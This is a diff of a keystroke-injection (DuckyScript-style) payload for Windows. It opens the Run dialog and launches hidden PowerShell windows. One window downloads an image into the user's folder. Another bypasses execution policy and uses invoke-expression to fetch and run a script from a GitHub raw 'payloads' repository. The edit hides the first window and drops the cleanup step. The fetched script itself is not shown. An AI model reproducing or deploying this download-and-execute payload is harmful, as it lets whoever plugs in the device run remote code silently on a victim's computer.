@@ -1,31 +1,18 @@
 DEFINE #SCRIPTURL https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/background/background.ps1
+DEFINE #IMAGETURL https://www.continental-tires.com/adobe/dynamicmedia/deliver/dm-aid--b598c174-2024-490c-8db0-2ccb45fab848/continental-sustainability-strategicfields-greenoperations-16-9.jpg
 
-DELAY 3000
 GUI r
-DELAY 300
-STRING powershell
-ENTER
-DELAY 300
-STRING Invoke-WebRequest -Uri https://www.continental-tires.com/adobe/dynamicmedia/deliver/dm-aid--8dc38e48-6b0c-445d-9f70-7347d990c1a0/continental-tires-all-business-areas-header.jpg?preferwebp=true&quality=85&width=2000 -OutFile theimage.jpg
-ENTER
-DELAY 100
-STRING exit
+DELAY 500
+STRING powershell -w h Invoke-WebRequest -Uri #IMAGETURL -OutFile C:/Users/$env:UserName\theimage.jpg
 ENTER
 DELAY 1000
+STRING exit
+
 GUI r
-DELAY 300
+DELAY 500
 STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr #SCRIPTURL?dl=1; invoke-expression $pl
 ENTER
 DELAY 1000
-GUI r
-DELAY 300
-STRING powershell
-ENTER
-DELAY 300
-STRING Remove-Item theimage.jpg
-ENTER
-DELAY 300
 STRING exit
-ENTER
-DELAY 300 
+
 GUI d
